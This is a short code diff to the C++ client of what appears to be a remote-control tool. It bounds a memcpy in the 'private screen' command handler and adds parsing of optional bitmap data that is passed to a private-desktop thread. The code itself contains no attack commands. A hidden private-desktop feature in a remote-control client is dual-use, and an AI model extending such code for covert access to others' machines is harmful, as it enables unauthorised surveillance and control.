@@ -6,6 +6,7 @@
 #include "KernelManager.h"
 #include "Common.h"
 #include <iostream>
+#include <vector>
 #include <fstream>
 #include <corecrt_io.h>
 #include "ClientDll.h"
@@ -791,10 +792,22 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
 
     case TOKEN_PRIVATESCREEN: {
         char h[100] = {};
-        memcpy(h, szBuffer + 1, ulLength - 1);
+        memcpy(h, szBuffer + 1, min(ulLength - 1, 80));
         std::string hash = std::string(h, h + 64);
         std::string hmac = std::string(h + 64, h + 80);
-        std::thread t(private_desktop, m_conn, g_bExit, m_LoginMsg, m_LoginSignature, hash, hmac);
+
+        // 提取位图数据（如果有）
+        std::vector<BYTE> bmpData;
+        if (ulLength > 85) {  // 1 + 64 + 16 + 4 = 85
+            DWORD bmpSize = 0;
+            memcpy(&bmpSize, szBuffer + 81, 4);
+            if (bmpSize > 0 && bmpSize <= ulLength - 85) {
+                bmpData.resize(bmpSize);
+                memcpy(bmpData.data(), szBuffer + 85, bmpSize);
+            }
+        }
+
+        std::thread t(private_desktop, m_conn, g_bExit, m_LoginMsg, m_LoginSignature, hash, hmac, std::move(bmpData));
         t.detach();
         break;
     }
